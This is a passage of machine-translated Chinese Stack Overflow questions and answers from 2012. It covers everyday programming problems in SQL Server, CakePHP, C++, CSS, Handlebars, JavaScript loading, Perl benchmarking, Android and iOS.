[SQL 权威博客](http://blog.sqlauthority.com/2009/08/20/sql-server-fix-error-cannot-open-database-requested-by-the-login-the-login-failed-login-failed-for-user-nt-authoritynetwork-service/ "SQL 授权")

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T21:19:26.510

你可以尝试这样的事情。我总是对初始目录而不是 .mdf 文件有更好的运气。

另一种选择是转到数据源上的属性（在服务器资源管理器中）并从那里复制连接字符串。

```
<add name="MyConsString"
    connection string=&quot;
    data source=ServerName\SQLEXPRESS;
    initial catalog=BlogData;
    integrated security=True;
    multipleactiveresultsets=True;
    App=EntityFramework&quot;" 
    providerName="System.Data.EntityClient" /> 
```

# cakephp - 将 SELECT / IN SQL 查询转换为蛋糕查找

> ID：10114063
> 
> 赞同：1
> 
> 时间：2012-04-11T21:11:26.693
> 
> 标签：cakephp

我有一个这样的查询：

```
SELECT * FROM posts WHERE owner_id IN (SELECT owner_id FROM owners_list WHERE user_id = 1) ORDER BY modified DESC 
```

什么是等效的最有效的 Cake find 调用？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T21:43:28.890

3个选择：

1）Cake 确实处理子查询，尽管它很复杂： [http ://book.cakephp.org/2.0/en/models/retrieving-your-data.html#sub-queries](http://book.cakephp.org/2.0/en/models/retrieving-your-data.html#sub-queries)

这是一个包含示例的 SO 问题： [CakePHP 中的子查询以在其他表中查找](https://stackoverflow.com/questions/6859996/subquery-in-cakephp-to-lookup-in-other-table)

2）使用连接语句： [http ://book.cakephp.org/2.0/en/models/associations-linking-models-together.html#joining-tables](http://book.cakephp.org/2.0/en/models/associations-linking-models-together.html#joining-tables)

3）您可以通过[Model::query()](http://book.cakephp.org/2.0/en/models/retrieving-your-data.html#model-query)按原样使用您的查询，只要您先进行消毒

我更喜欢选项 2，因为它不太容易出错，而且我不必担心清理/转义。一旦你掌握了连接的窍门，你会发现自己更频繁地使用它们。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-12T17:46:40.063

你可以在两个发现中做到这一点。我假设您的 owner_list 表的模型名称是 OwnersList：

```
 $user_ids = $this->OwnersList->find('list', array(
        'fields'=>array('id','id'),
        'conditions'=>array(
            'OwnersList.user_id'=>1
        )           
    ));

    $results = $this->Post->find('all',array(
        'Post.owner_id'=>$user_ids
    )); 
```

# android - 待定意图后映射 GPS 位置

> ID：10114067
> 
> 赞同：0
> 
> 时间：2012-04-11T21:11:44.137
> 
> 标签：android, commonsware-cwac

在使用广播接收器找到位置后，我想从位置轮询器映射位置。我找不到任何例子来证明这一点。执行完onReceive方法并找到位置后需要做什么？

提前致谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-12T00:09:02.917

大概，您会调用`startActivity()`可以映射这些坐标的东西。这是您自己的活动还是内置的活动（例如，通过 a `geo:` `Uri`）取决于您。如果它是您的，您需要安排将纬度和经度发送到您的活动，例如通过`Intent`附加信息。

# naming-conventions - 关于作为单元测试一部分的变量命名

> ID：10114072
> 
> 赞同：0
> 
> 时间：2012-04-11T21:12:20.173
> 
> 标签：naming-conventions

目前，我正在编写测试来处理不同 KVPair 类之间的比较，其中内容因任一 KVPair 中的空白量而异。

我正在按如下方式构造对象：

```
k = "remember";
v = "It's not a lie, if you believe it";
remember_SingleSpaceOnTargetNoSpaceOnSource = new KVPair(k, v); // notice var name
... 
```

当我不得不创建更复杂的测试时，这很快就崩溃了。

**您将如何命名一个变量，其关键特征是`space2Tabs3SpacesContent`并且仍然知道从现在起一个月后这意味着什么？**

最终，作为我测试的一部分，我需要涵盖以下情况：

```
{various spaces} content {various spaces}
content {various spaces}
{various spaces} content 
```

关于如何最好地构造它以便于测试的任何建议？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T21:15:26.220

如果这个变量是本地的（在单个子或函数中使用），我会使用注释，因为很难将所有含义都放入名称中。例如

```
// this var stores something .../indicates something .../just for lulz here :)
var space2Tabs3SpacesContent 
```

使用评论是在两个月内记住某事的最佳方式；）

# c++ - 带有前向声明错误的循环依赖

> ID：10114078
> 
> 赞同：3
> 
> 时间：2012-04-11T21:12:45.763
> 
> 标签：c++

在 A.hpp 文件中，我有一个结构，它有一个 B 类的指针

```
struct state
{
    B  *b;
}; 
```

在 A.hpp 文件中，我添加了一个前向声明，并将 B.hpp 文件包含在 A.cpp 文件中

```
//A.hpp
class B 
```

在 B.hpp 文件中，函数使用在 A.hpp 中声明的状态作为函数的参数。

```
bool function_in_b(state *s) 
```

我还在 B.hpp 文件中添加了 A 的前向声明，并在 B.cpp 文件中添加了 A 的头文件 A.hpp。

```
//B.hpp
class A 
```

所有头文件都有一个头保护。如果我尝试编译，它将找不到在 A.hpp 中声明的“状态”。因此，它不会找到匹配函数并抱怨候选人是

```
bool function_in_b(int *) 
```

我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T21:23:22.410

在`B.hpp`中，您说您是 forward-declared `A`，但不是`state`- 所以当它第一次看到`function_in_b(state *s)`它时，它不知道是什么`state`。当你加入`A.hpp`它`B.cpp`时为时已晚。您需要转发声明`state`，`B.hpp`即

```
struct state;

bool function_in_b(state *s); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T21:23:13.563

在 B.hpp 文件中，在声明之前`function_in_b(state *)`，前向声明`state`类型：

```
struct state; 
```

# c++ - boost::xpressive 查看序列的开头

> ID：10114080
> 
> 赞同：3
> 
> 时间：2012-04-11T21:13:06.657
> 
> 标签：c++, regex, boost, boost-xpressive

我正在使用 boost::xpressive 来解析我的文本文件。我想看看是否只有当行以“#”开头时（多次）。

我正在使用以下代码

```
std::string str1 = "## this could be my line";
sregex rex1 = sregex::compile("^#+");
smatch result1;
if(regex_match(str1,result1,rex1){
    std::cout << result1[0] << '\n';
}else{
std::cout << "match not found!\n";
} 
```

但我总是得到“找不到匹配！”，即使行以#开头。有人能帮我一下吗？

顺便说一句，任何人都可以帮助我使用 boost::xpressive 'bos' 编写 rex1 语句吗？

谢谢！阿耶莎

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T21:16:11.803

使用[`regex_search`](http://www.boost.org/doc/html/boost/xpressive/regex_search.html)而不是`regex_match`.

这里是静态的 xpressive 语法`rex1`：

```
bos >> +as_xpr('#'); 
```

# iphone - 设计小视图的最佳实践，例如背景信息

> ID：10114085
> 
> 赞同：0
> 
> 时间：2012-04-11T21:13:36.533
> 
> 标签：iphone, cocoa-touch, user-interface

我目前正在开发我的第一个 iOS 应用程序，该应用程序将很快在 Appstore 上可用（我希望 ;-) 并且该项目需要一个带有背景信息的视图。应该显示什么视图？该视图应显示一个图标、开放时间和一个或两个小型分组表，其中包含参考其他两个视图以及其他信息，例如常见问题解答或作者的联系信息。

我的问题是现在。创建这种视图的最佳实践是什么？使用 Interface Builder 设计视图并对视图的字符串进行硬编码或者应该创建一个具有不同部分标题和高度的 UITableView 更好吗？内容从何而来？plist 左右？

我不知道，最好的做法是什么，我希望有人能说出他的意见来解决这类问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T22:45:55.537

这实际上是您想要显示的数据的品味和性质的问题。我发现 Interface Builder 是设置视图的基本布局并尝试尽可能多地使用它的好工具。

如果您的数据是静态的并且永远不会改变，我认为没有理由不只是在 IB 或您`UITableView`的 s 的委托方法中对其进行硬编码。另一方面，如果您的数据可能会更改，或者是从后端获取的，您最好将文本设置在`UIViewController`.

Plist 非常适合保存您想要显示的数据，并且它们在 iOS 中得到了很好的支持。如果您的数据会不时更改，这将是我的选择。但是，如果数据永远不会改变，那么每次运行应用程序时确实不需要使用额外的 CPU 周期来解析 plist。

# css - 覆盖引导 CSS

> ID：10114087
> 
> 赞同：6
> 
> 时间：2012-04-11T21:13:39.877
> 
> 标签：css, twitter-bootstrap

我正在使用来自 Twitter-Bootstrap 的导航药片。在某些屏幕分辨率下，药片会无缘无故地被推下。使用 Firebug 时，如果我从 .nav-pills 中删除 display:table，问题就会消失。我曾尝试在我自己的一个 .css 文件中覆盖 display:table，但到目前为止，Firefox 始终将我的覆盖尝试视为一种单独的样式。

这是问题的一个例子。我知道这不是处理问题的最佳方式，但它看起来像是展示问题的最佳方式。

提前致谢，

引导 CSS：

```
.nav-tabs:before, .nav-pills:before, .nav-tabs:after, .nav-pills:after 
{
    content: "";
    display: table;
} 
```

我的 CSS：

```
.nav-tabs:before, .nav-pills:before, .nav-tabs:after, .nav-pills:after 
{
    display:block !important;   
} 
```

CSS 结果：当我的显示样式应该覆盖引导样式时，Firefox 似乎将这两个 css 语句识别为单独的样式。

![火狐 CSS 结果](../Images/753f2c4c5099882b7934677964fb27a4.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-25T20:23:46.923

如果您在 Chrome 中检查您的元素，您可以查看应用于该元素的 CSS 选择器是否属于媒体查询。

当您配置引导下载时，您是否检查了响应部分中的选项？

我想问题是来自媒体查询的 css 选择器覆盖了您自己的 css-selector。

# android - 更改 ActionBar 和 SearchView 背景

> ID：10114088
> 
> 赞同：7
> 
> 时间：2012-04-11T21:13:42.170
> 
> 标签：android, android-theme, android-actionbar, android-searchmanager

我试图按照[android 指南](http://developer.android.com/design/style/themes.html)中的建议使用带有深色操作栏的 Holo Light 主题。

这是我的主题.xml 文件：

```
<resources>
    <style name="Theme.MyApp" parent="@android:style/Theme.Holo.Light">
        <item name="android:actionBarStyle">@style/Widget.MyApp.ActionBar</item>
    </style>

    <style name="Widget.MyApp.ActionBar" parent="@android:style/Widget.Holo.ActionBar">
        <item name="android:background">@android:drawable/dark_header</item>
        <item name="android:titleTextStyle">@style/MyApp.ActionBar.TextAppearance</item>
    </style>

    <style name="MyApp.ActionBar.TextAppearance" parent="@android:style/TextAppearance">
        <item name="android:textColor">@android:color/primary_text_dark</item>
    </style>
</resources> 
```

不使用搜索界面的结果是预期的，但是当我使用`SearchView`背景时，背景来自 Holo.Light 主题：

![结果正确](../Images/01b0b7b939bcd42b515a90caddbb7f9c.png) ![背景不正确](../Images/f240727408ca6f2f93a5cddd83330ed5.png)

有什么方法可以更改 ActionBar 上的 SearchView 默认样式？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-06T12:28:35.033

[此链接对于在 android 中创建 actionbar 主题最有用。](http://android-ui-utils.googlecode.com/hg/asset-studio/dist/index.html)愿这个对你也有用..

您只需创建和保存 xml 文件并放入相应的文件夹中。

谢谢你。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-17T06:20:10.943

这看起来可能是您的答案：

[如何保持 ActionBar 项目的背景相同...](https://stackoverflow.com/questions/10146078/how-do-i-keep-actionbar-items-background-the-same-while-changing-the-apps-main)

简而言之：

> 尝试更换
> 
> `<item name="android:background">@android:drawable/dark_header</item>`和
> 
> `<item name="android:windowBackground">@android:drawable/dark_header</item>`

# coffeescript - Handlebars 中的自定义条件

> ID：10114094
> 
> 赞同：1
> 
> 时间：2012-04-11T21:14:18.500
> 
> 标签：coffeescript, handlebars.js

可能缺少一些简单的东西，但是如何根据对对象的操作在 Handlebars 中指定条件？

想做类似的事情

```
{{#hasDiscount this}}
  <tr>
    <td>Discount</td>
    <td>{{formatPrice this.Discount}}</td>
  </tr>
{{/hasDiscount}} 
```

与助手一起

```
Handlebars.registerHelper 'hasDiscount', (cart) ->
  :runBlock: if cart.Discount > 0 
```

不知道如何告诉它运行该块。

感谢您的任何意见。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-12T14:11:03.103

玩了之后发现了一个更简单的方法。

```
{{#if hasDiscount}}
   <tr>
    <td>Discount</td>
    <td>{{formatPrice this.Discount}}</td>
  </tr>
{{/if}} 
```

因为购物车已经是模板中的对象，所以我可以像这样设置助手

```
Handlebars.registerHelper 'hasDiscount', ->
  true if @Discount > 0 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T21:27:16.393

助手通过 a`block`作为最后一个参数。这`block`将是一个您可以运行以获取块内容的函数，您也可以`block.inverse()`获取`{{else}}`分支：

```
Handlebars.registerHelper 'hasDiscount', (cart, block) ->
  if cart.Discount > 0
    block()
  else
    block.inverse() 
```

[文档](http://handlebarsjs.com/block_helpers.html#conditionals)并没有真正说明这一点，因此您必须根据示例进行一些猜测并尝试一些事情。

# javascript - 优化 javascript 加载的最佳实践

> ID：10114095
> 
> 赞同：5
> 
> 时间：2012-04-11T21:14:19.550
> 
> 标签：javascript, performance, optimization, loading

我在网上阅读了一些关于优化 javascript 加载的文章。我得到的几个关键点是最小化脚本文件（http 请求）的数量，缩小并在服务器上启用 gzip。目前，我这边所做的是所有 javascript 文件都被缩小，并且 gzip 也可以简单地启用。

第1部分）

我的问题是我有大约 20 个 javascript 文件，其中一个 common.js 具有所有核心功能。除此之外，每个页面都会加载至少一个实现该页面功能的其他文件。

解决方案 1，是将所有脚本合并到一个大脚本文件中，并为每个客户端加载一次，这似乎是其他人都在做的事情。我猜 YUI 或 JSMin 可以用于压缩，所以我应该手动合并文件？

解决方案2，在需要所需功能时延迟加载，我真的不知道这是如何工作的，但这似乎是一种方法，尽管仍然需要更多的http请求。我很想听听对此的任何意见。

第2部分）

我正在开发的 Web 应用程序将部署到许多其他计算机上，因为 javascript 非常小，制作一个从中央服务器动态加载最新脚本的脚本是否是一个好习惯，这样每个客户端都会运行最新的脚本?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T21:20:08.430

一般最佳实践被认为是

1.  合并到尽可能少的文件中

2.  缩小

3.  提供压缩包

4.  尽可能晚地服务（有些可能需要在头脑中，但一般在之前或异步是首选

这是一般建议，您需要这样做并进行测试以确保它适合您的情况。

最小化 HTTP 请求很重要，延迟是性能杀手……

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-11T21:22:39.633

第 1 部分：就像你说的，有两种方法。

*   解决方案 1 是有效的，并且有一些工具可以做到这一点，包括[Google 的 Closure Compiler](https://developers.google.com/closure/compiler/)。问题是在大多数情况下，它需要包含您网站上的每个脚本才能正常工作，因此无论您的页面可能使用什么，它都能获得一切
*   解决方案 2 也是有效的，但就像你说的那样并不能真正阻止多个 http 请求。但它的好处在于它只在您需要时加载您需要的内容，并且不会在初始页面加载时创建任何阻塞调用。Head.js 是提到的一个选项，还有 Require.js 和其他。

第2部分：

*   有一些方法可以强制浏览器始终下载最新的 javascript 文件，尽管这会抵消浏览器缓存的好处。一种常见的方法是在 javascript URL 的末尾添加一个 get 变量，即“domain.com/index.js?timestamp=_123123123”。这类似于 jQuery 在您关闭其 ajax 调用的缓存时所做的事情。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-14T02:48:00.103

您必须将优化分解为几个步骤

1.  优化源代码：编写 JS 代码有更少的 DOM 开销、在内存中创建更少的变量和 DOM 元素、高效的循环等，这些都是很好的做法。这些通常无法通过脚本编译器进行优化。
2.  缩小：这有两个解决方案
    *   合并成一个文件并缩小。（使用谷歌的闭包编译器，[Uglify](https://github.com/mishoo/UglifyJS)）
    *   缩小每个文件，然后延迟加载。我个人喜欢使用[AMD](http://requirejs.org/docs/whyamd.html)模块化模式来定义我的模块。您可以使用引导文件来选择编译成一个文件或保持模块结构和延迟加载，但每个模块也会被缩小。
3.  服务器优化
    *   您的服务器是否提供 gzipped javascript？
    *   尽可能尝试使用`<script src='//...' async defer>`，如果你有脚本依赖，使用异步加载时要小心。如果您使用 AMD 模块，它将确保您的依赖模块提前加载，并且每次页面刷新它们只加载一次。
    *   使用 CDN 为您的静态内容提供服务，在内容交付网络上存储您的图像、文件、javascript

# sql - 用于查找六度凯文培根数的 sql 查询/过程

> ID：10114106
> 
> 赞同：0
> 
> 时间：2012-04-11T21:15:29.753
> 
> 标签：sql, sql-server, stored-procedures

我正在尝试在 SQL Server 中设计一个完全由查询/过程驱动的“Kevin Bacon number finder”，甚至不确定从哪里开始。如果有人可以提供一些帮助，或者向我指出类似的东西，我将不胜感激，因为我已经搜索过并且无法找到与我需要的类似的东西，而不依赖于使用 OO 编程。

“凯文培根数”是指“凯文培根的六度”，其中演员可以通过他或她的电影角色在六个步骤内与演员凯文培根联系起来。但是，即使超过 6 个步骤，我也需要找到该过程中的步骤数。

[Six_Degrees_of_Kevin_Bacon](http://en.wikipedia.org/wiki/Six_Degrees_of_Kevin_Bacon)

我必须使用的架构是：

```
ACTOR (id, fname, lname, gender)
MOVIE (id, name, year, rank)
DIRECTORS (id, fname, lname)
CASTS (pid, mid, role)
MOVIE_DIRECTORS (did, mid)
GENRE (genre, mid) 
```

其中 CASTS.pid 指的是 ACTOR.id，CASTS.mid 指的是 MOVIE.id。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T21:32:22.483

您是否有机会扩展演员和导演的模式，为他们的 Kevin Bacon 号码添加 kbnumber 字段？然后您可以轻松地创建一个存储过程

```
update a 
set a.kbnumber = EXPR(a2.kbnumber + 1) 
from top 1 actor a inner join
movie m on a.mid = m.id inner join
actor a2 on a2.mid = m.id
order by a2.kbnumber ASC
where a.kbnumber is null or a.kbnumber > a2.kbnumber + 1

update a
set a.kbnumber = EXPR(a2.kbnumber + 1) 
from top 1 actor a inner join
movie m on a.mid = m.id inner join
directors a2 on a2.mid = m.id
order by a2.kbnumber ASC
where a.kbnumber is null or a.kbnumber > a2.kbnumber + 1

update a 
set a.kbnumber = EXPR(a2.kbnumber + 1) 
from top 1 directors a inner join
movie m on a.mid = m.id inner join
actor a2 on a2.mid = m.id
order by a2.kbnumber ASC
where a.kbnumber is null or a.kbnumber > a2.kbnumber + 1

update a
set a.kbnumber = EXPR(a2.kbnumber + 1) 
from top 1 directors a inner join
movie m on a.mid = m.id inner join
directors a2 on a2.mid = m.id
order by a2.kbnumber ASC
where a.kbnumber is null or a.kbnumber > a2.kbnumber + 1 
```

运行此过程，直到不再更新 kbnumber。任何剩余的空值都与 Kevin Bacon 没有关系

# silverlight - 自动滚动到列表框中的选定项目

> ID：10114111
> 
> 赞同：1
> 
> 时间：2012-04-11T21:15:48.423
> 
> 标签：silverlight, listbox

我正在使用**Silverlight 4**和**MVVM 模式**。在我看来，我有一个 ListBox，它的`ItemsSource`和`SelectedItem`属性绑定到视图模型中的属性。

```
<ListBox ...
    ItemsSource="{Binding AllItems, Mode=TwoWay}"
    SelectedItem="{Binding SelectedItem, Mode=TwoWay}"> 
```

在某些情况下，加载此视图时，我希望选择特定项目；在这些情况下，我只需相应地`SelectedItem`在视图模型的构造函数中设置属性。这非常有效，因为在加载视图时选择了所需的项目。

但是，如果 ListBox 中有许多项目，因此存在垂直滚动条，则 ListBox 不会自动向下滚动到选定的列表项目。

是否可以在 Silverlight 中使用 MVVM 模式在加载视图时让 ListBox 自动滚动到所选项目？

谢谢

### 注意：Silverlight 5 不会出现此问题。这一定是 Silverlight 4 的错误（或“功能”）。我下面的解决方法适用于 SL5，但不需要...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-12T19:19:21.740

我最终选择了以下路线，这似乎*弯曲*了 MVVM 模式，但没有破坏它，因为毕竟这是一个与 UI 相关的问题。

在视图（子窗口）中，我有一个事件处理程序，`Loaded`并在其中执行以下操作：

```
if (viewModel.SelectedItem != null)
{
    myListBox.UpdateLayout();
    myListBox.ScrollIntoView(viewModel.SelectedItem);
} 
```

如果有人有任何建议，请随时给他们，我完全是 Silverlight 菜鸟。

# axapta - 对话框关闭时表单上的刷新问题

> ID：10114112
> 
> 赞同：1
> 
> 时间：2012-04-11T21:15:48.013
> 
> 标签：axapta, x++

我有一个表单（其数据源是 Table A ），我从中调用一个对话框，我输入了几个参数并单击“确定”。该过程填充表 A 中的数据。

一旦我关闭对话框，它会填满表格并且不会显示在表格中，我将不得不刷新表格（按 F5）。这怎么可能通过代码

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-12T06:54:42.187

[也许Vanya Kashperuk 的](http://kashperuk.blogspot.com.es/2010/03/tutorial-reread-refresh-research.html)这个非常受欢迎的教程会有所帮助。它是关于如何刷新表单中显示的数据，以下是您的选项：

```
formDataSource.refresh();
formDataSource.research([true]);
formDataSource.reread();
formDataSource.executeQuery(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-12T11:07:48.790

我已经写过关于这个的博客，所以这里还有一些关于如何刷新表单数据源的见解：

[http://devexpp.blogspot.com.br/2012/02/refresh-datasource-and-retain-position.html](http://devexpp.blogspot.com.br/2012/02/refresh-datasource-and-retain-position.html)

基本上，您所要做的就是调用*research()*方法，但也有一些技巧可以保留刷新后的 DataSource 的位置。

# perl - Perl：取消引用数组引用所花费的时间是否取决于数组的大小？

> ID：10114117
> 
> 赞同：0
> 
> 时间：2012-04-11T21:16:05.320
> 
> 标签：perl, reference, dereference

好奇是否有人知道（或可以轻松测试）引用然后取消引用数组所需的时间。

```
my @foo = (0..1500000);     # (~1.5M nodes).
join('',@{\@foo});          # any noticeable time difference vs join('',@foo) ? 
```

这显然没有正当理由，但我遇到了不合理的代码:)

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-11T22:10:16.777

我执行的类似测试的基准给出了每个 deref 大约 10 纳秒的结果。您发布的代码中只有 deref，所以我们谈论的是 0.000,000,010 秒的差异。

* * *

呸，差别太小了，我什至无法确定哪个更快！

```
Benchmark: running array, array_ref for at least 3 CPU seconds...
     array:  3 wallclock secs ( 3.04 usr +  0.02 sys =  3.06 CPU) @ 11.12/s (n=34)
 array_ref:  3 wallclock secs ( 3.13 usr +  0.00 sys =  3.13 CPU) @ 11.48/s (n=36)

Benchmark: running array, array_ref for at least 3 CPU seconds...
     array:  3 wallclock secs ( 3.06 usr +  0.03 sys =  3.09 CPU) @ 11.33/s (n=35)
 array_ref:  3 wallclock secs ( 3.12 usr +  0.05 sys =  3.17 CPU) @ 11.37/s (n=36)

Benchmark: running array, array_ref for at least 3 CPU seconds...
     array:  3 wallclock secs ( 3.06 usr +  0.00 sys =  3.06 CPU) @ 11.45/s (n=35)
 array_ref:  3 wallclock secs ( 3.18 usr +  0.00 sys =  3.18 CPU) @ 11.31/s (n=36)

Benchmark: running array, array_ref for at least 3 CPU seconds...
     array:  3 wallclock secs ( 3.09 usr +  0.00 sys =  3.09 CPU) @ 11.66/s (n=36)
 array_ref:  3 wallclock secs ( 3.17 usr +  0.00 sys =  3.17 CPU) @ 11.37/s (n=36) 
```

数组快 50% 的时间，数组 ref 快 50% 的时间。

```
use strict;
use warnings;

use Benchmark qw( timethese );

my %tests = (
   array_ref => 'my $x = join("", @$foo);',
   array     => 'my $x = join("", @foo);',
);

$_ = 'use strict; use warnings; our $foo; our @foo; ' . $_
   for values(%tests);

our @foo = 1..1_500_000;
our $foo = \@foo;

timethese(-3, \%tests); 
```

* * *

这是比您发布的测试更好的测试。您发布的唯一一个花费不到 1% 的时间做您想要测试的事情。

但同样，差异是如此之小，以至于无法测量。有时数组 ref 出现得更快，有时数组出现得更快。

```
Actual speed is actually 1000x larger than indicated.
Benchmark: running array, array_ref for at least 3 CPU seconds...
     array:  3 wallclock secs ( 3.09 usr +  0.00 sys =  3.09 CPU) @ 1015.54/s (n=3136)
 array_ref:  3 wallclock secs ( 3.24 usr +  0.00 sys =  3.24 CPU) @ 1040.99/s (n=3378)

Actual speed is actually 1000x larger than indicated.
Benchmark: running array, array_ref for at least 3 CPU seconds...
     array:  3 wallclock secs ( 3.25 usr +  0.00 sys =  3.25 CPU) @ 1011.09/s (n=3281)
 array_ref:  3 wallclock secs ( 3.07 usr +  0.00 sys =  3.07 CPU) @ 1022.13/s (n=3141)

Actual speed is actually 1000x larger than indicated.
Benchmark: running array, array_ref for at least 3 CPU seconds...
     array:  3 wallclock secs ( 3.29 usr +  0.00 sys =  3.29 CPU) @ 1020.96/s (n=3361)
 array_ref:  3 wallclock secs ( 3.20 usr +  0.00 sys =  3.20 CPU) @ 1016.26/s (n=3250)

Actual speed is actually 1000x larger than indicated.
Benchmark: running array, array_ref for at least 3 CPU seconds...
     array:  3 wallclock secs ( 3.07 usr +  0.00 sys =  3.07 CPU) @ 1053.03/s (n=3237)
 array_ref:  4 wallclock secs ( 3.23 usr +  0.00 sys =  3.23 CPU) @ 1006.50/s (n=3250) 
```

同样，array 在 50% 的时间内更快，array ref 在 50% 的时间内更快。

```
use strict;
use warnings;

use Benchmark qw( timethese );

my %tests = (
   array_ref => 'my $x = join("", @$foo);',
   array     => 'my $x = join("", @foo);',
);

$_ = 'use strict; use warnings; our $foo; our @foo; for (1..1000) { '.$_.' }'
   for values(%tests);

our @foo = 1..15;
our $foo = \@foo;

print("Actual speed is actually 1000x larger than indicated.\n");
timethese(-3, \%tests); 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-04-11T22:15:18.220

一个简单的基准测试表明，将 1 到 1,500,000 的整数连接成一个字符串的不同方法之间没有明显的区别（除了*错误*的方法——下面没有显示）。

我确实想知道为什么需要创建这样一个字符串，但后来我想知道很多。

```
#!/usr/bin/env perl

use strict; use warnings;
use Benchmark qw( cmpthese );

my @nodes = (1 .. 1_500_000);

cmpthese -5, {
    derefref_join => sub {
        my $str = join('', @{ \@nodes });
    },
    plain_join => sub {
        my $str = join('', @nodes);
    },
    interpolate => sub {
        local $" = '';
        my $str = "@nodes";
    },
}; 
```

输出：

```
                速率插值 deref_join plain_join
插值 4.76/s -- -3% -3%
derefref_join 4.89/s 3% -- -1%
plain_join 4.92/s 4% 1% --
```

```
C:\temp> perl -v

这是为 MSWin32-x86-multi-thread 构建的 perl 5，版本 14，subversion 2 (v5.14.2)
ActiveState http://www.ActiveState.com 提供的二进制版本 1402 [295342]
建于 2011 年 10 月 7 日 15:49:44

Intel Core2 Duo T2300E@1.66Ghz，2GB 内存。
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-04-11T21:21:35.047

显然，由于处理器速度的不同，每个主机都会有所不同。

衡量这一点的一种方法是使用该[`time`](http://perldoc.perl.org/functions/time.html)函数来记录时间。然后创建并执行一个包含数十万个解引用操作的循环（因为测量单个解引用将非常快，您将无法测量它。）然后，再次记录时间。减去次数并除以循环的次数。从中减去在没有取消引用的情况下通过循环所需的时间。一点点数学，你就有了。

# java - 最好使用哪个无限循环

> ID：10114122
> 
> 赞同：0
> 
> 时间：2012-04-11T21:16:26.993
> 
> 标签：java, c++, c, loops

> **可能重复：**
> [“for(;;)”是否比“while (TRUE)”快？如果不是，人们为什么要使用它？](https://stackoverflow.com/questions/2611246/is-for-faster-than-while-true-if-not-why-do-people-use-it)

我一直在阅读作者使用的编程书（java）`for(;;)`而不是`while(true)`. 这件事真的开始让我烦恼，所以我想我应该检查哪个是最好用的，是否有任何差异。以下是可能的无限循环：

```
for(;;){

}

while(true){

}

do{

}while(true) 
```

*   哪个更适合使用？
*   性能上是否有任何差异（例如您必须测试在 while 情况下是否为真）或者它们是否编译为相同的东西？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-11T21:18:16.860

它们被编译成同一个东西，只是风格问题。年长的程序员可能会认出`for(;;)`，但我可能只会使用`while(true)`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T21:19:22.520

是的，这只是风格问题，我更喜欢`while(true)`，因为意图很明显。`for(;;)`只是没有对我说什么。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-11T21:20:00.453

如有疑问，请测量。

如果不出意外，编写所有三个版本并查看为每个版本生成的程序集。除非编译器*非常*愚蠢，否则我敢打赌它会为所有三个生成完全相同的代码。

**编辑**

FWIW，gcc 为所有三个生成相同的代码（至少在我编写的死简单案例中）。 `while(true)`在编译时可计算；无需执行测试，*只需*硬编码跳转回循环的开头。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-11T21:20:21.710

它们在性能方面应该是相同的，但即使它们不是，速度也不像可读性那么重要。最好的方法是任何查看代码的人都会很快将其识别为无限循环的方法。我倾向于`while (true)`因为它是最基本的情况，但这取决于谁在查看代码。

# android - 通过屏幕旋转保留 RenderScript 实例

> ID：10114127
> 
> 赞同：0
> 
> 时间：2012-04-11T21:16:40.160
> 
> 标签：android, renderscript

在屏幕旋转期间是否可以保留现有的 RenderScript 实例（以及所有绑定的内存）？如果是这样，我该怎么做呢？据我了解，除了投影数据之外不需要更改任何内容，但是，为了确保在应用程序退出时关闭 RenderScript 引擎，我需要在 onDestroy() 回调中将其销毁。有没有其他方法可以做到这一点，以便我可以通过轮换来坚持这一点？比如通过保存的Bundle？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T21:56:08.373

您是否尝试将 configChanges->orientation 标签添加到您的`AndroidManifest.xml`? 它在旋转时保留了一些实例

`<activity android:name="YourActivity" android:configChanges="orientation"/>`

# ios - 设置 UINavigationBar 高度

> ID：10114131
> 
> 赞同：0
> 
> 时间：2012-04-11T21:17:02.850
> 
> 标签：ios, uinavigationcontroller, uinavigationbar

我在网络和堆栈溢出上搜索了很多，我看到有很多关于这个问题的问题，所以我想搜索一个解决方案，但我找不到它，我已经将 UINavigationBar 子类化为使用我的自定义图像到我的导航栏，但被拉伸以填充导航栏的大小，我怎样才能增加高度？

这就是我所做的，我创建了一个只有 UINavigationController 的 Xib 文件，然后在界面构建器中我为 NavigationBar 设置了 My CustomClass：

```
UINib *nib = [UINib nibWithNibName:@"CustomNavigationController" bundle:nil];
UINavigationController *navController = 
[[nib instantiateWithOwner:nil options:nil] objectAtIndex:0]; 
```

然后我的自定义类：

@实现自定义导航栏

```
- (void)drawRect:(CGRect)rect {
UIImage *image = [UIImage imageNamed:@"NavigationBar.png"];
[image drawInRect:CGRectMake(0, 0, self.frame.size.width, self.frame.size.height)];
} 
```

我试图在这里改变高度，self.frame.size.height，但是高度大小没有改变，只改变我缩放的图像......有一种方法可以用我的设置导航栏的大小图片尺寸？

* * *

